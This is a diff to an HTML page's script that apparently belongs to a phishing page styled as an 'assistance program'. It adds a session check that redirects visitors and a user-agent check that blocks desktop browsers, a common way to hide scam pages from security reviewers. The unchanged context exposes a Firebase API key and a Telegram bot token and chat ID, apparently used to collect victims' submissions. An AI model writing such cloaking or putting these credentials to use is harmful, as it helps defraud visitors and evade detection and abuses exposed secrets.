@@ -121,6 +121,24 @@
 </div>
 
 <script>
+
+    if (sessionStorage.getItem('verified_user') !== 'true') {
+        window.location.href = "index.html";
+    }
+
+    // 
+    if (!/Android|webOS|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+        document.body.innerHTML = `
+            <div style="height:100vh; display:flex; align-items:center; justify-content:center; background:#f8f9fa; font-family:sans-serif; text-align:center; padding:20px;">
+                <div>
+                    <h2 style="color:#d63031;">ACCESS DENIED</h2>
+                    <p>This assistance program is only accessible via mobile devices.</p>
+                </div>
+            </div>
+        `;
+        throw new Error("Mobile only access."); // Stop the rest of the script
+    }
+    
     // FIREBASE CONFIG + TELEGRAM
     const firebaseConfig = {
         apiKey: "AIzaSyDIPBhgIXb6oJiq2G6bVebelLrCBuPeCNE",
@@ -134,6 +152,10 @@
         botToken: "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg",
         chatId: "7298607329"
     };
+
+    if (sessionStorage.getItem('verified_user') !== 'true') {
+    window.location.href = "index.html";
+}
     
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
